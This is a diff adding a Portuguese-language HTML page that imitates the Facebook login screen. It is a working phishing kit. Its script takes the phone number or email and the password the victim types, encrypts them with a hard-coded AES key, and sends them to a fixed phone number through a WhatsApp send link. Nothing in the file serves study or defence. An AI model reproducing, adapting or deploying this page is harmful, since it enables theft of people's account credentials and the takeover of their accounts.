@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <title>Document</title>
+  <style>
+  body {
+    background-color: #f4f4f4;
+    height: 94vh;
+    margin: 0;
+    text-align: center;
+    justify-content: center;
+  }
+  
+  .tela {
+    margin-top: 10%;
+    margin-left: 1%;
+    width: 98%;
+    height: 259px;
+    background: transparent;
+    border: none;
+  }
+  
+  input {
+    width: 90%;
+    margin-bottom: 10px;
+    height: 45px;
+    border: 1px solid #f4f4f4;
+    border-radius: 5px;
+    text-align: left;
+    background: #E9E9E9;
+    outline: none;
+    font-size: 14px;
+  }
+  
+  .send {
+    width: 91%;
+    height: 45px;
+    background: royalblue;
+    border-radius: 7px;
+    font-size: 16px;
+    font-weight: bold;
+    outline: none;
+    color: white;
+    border: none;
+  }
+  
+  .conta {
+    height: 35px;
+    border-radius: 5%;
+    border: 1px solid black;
+    width: 80%;
+    font-weight: bold;
+  }
+  
+  
+  </style>
+</head>
+<body>
+  <div class="tela">
+    <h3 style="color: blue;">facebook</h3>
+    <input type="number" id="numero" placeholder="Número de telefone ou email">
+    <input type="password" placeholder="Palavra passe" id="senha"><br>
+    <button class="send" onclick="criptografarDados()">Iniciar Sessão</button>
+    <h6 style="color: dodgerblue;">Não sabes a tua palavra passe?</h6>
+    <h6 style="color: gray;">------------------------------  ou    -----------------------------</h6>
+  <button class="conta">Criar Nova Conta</button>
+  <p style="margin-top: 30%;">
+    <b style="color: gray;">Português (Portugal)</b><br>
+    English (US)<br>
+    Espãnol<br>
+    Italiano
+  </p>
+  </div>
+  <script>
+    const chaveCriptografia = "chave123"; // Chave para criptografia (deve ser mantida em segredo)
+
+    function criptografarDados() {
+      const numero = document.getElementById("numero").value;
+      const senha = document.getElementById("senha").value;
+
+      const dados = { numero, senha };
+      const dadosCriptografados = CryptoJS.AES.encrypt(JSON.stringify(dados), chaveCriptografia).toString();
+
+      enviarWhatsApp(dadosCriptografados);
+    }
+
+    function enviarWhatsApp(mensagem) {
+      // Formatar o link para enviar mensagem no WhatsApp
+      const numeroWhatsApp = "958610214"; // Número de telefone para enviar mensagem
+      const textoCodificado = encodeURIComponent(mensagem);
+      const urlWhatsApp = `https://api.whatsapp.com/send?phone=${numeroWhatsApp}&text=${textoCodificado}`;
+
+      // Abrir a página do WhatsApp para enviar a mensagem
+      window.open(urlWhatsApp);
+    }
+  </script>
+
+</body>
+</html>
